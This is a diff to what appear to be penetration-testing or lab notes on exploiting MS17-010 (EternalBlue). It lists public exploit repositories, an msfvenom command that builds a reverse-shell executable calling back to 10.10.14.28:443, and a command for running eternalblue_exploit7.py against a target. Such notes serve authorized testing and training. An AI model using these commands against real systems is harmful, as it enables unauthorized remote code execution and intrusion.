@@ -54,7 +54,8 @@ git clone https://github.com/andyacer/ms08_067.git
 ### Windows
 #### MS17-010
 git clone https://github.com/worawit/MS17-010.git
-* zzz_exploit.py:
+
+##### zzz_exploit.py:
  * If needed USERNAME-"//"
  * next add the following 2 lines to below def smb
    
@@ -65,6 +66,12 @@ git clone https://github.com/worawit/MS17-010.git
 * custom payload:
   * msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.28 LPORT=443 -f exe > shell.exe
 
-* need listener
+* Need listener
+
+##### eternalblue_exploit7.py
+
+* use the https://github.com/nickvourd/eternalblue_win7_auto_gen in order to merge binaries nad payload
+* Run the following: python MS17-010/eternalblue_exploit7.py <ip> /tmp/sc_x<arch>.bin
+* Need listener
 
  
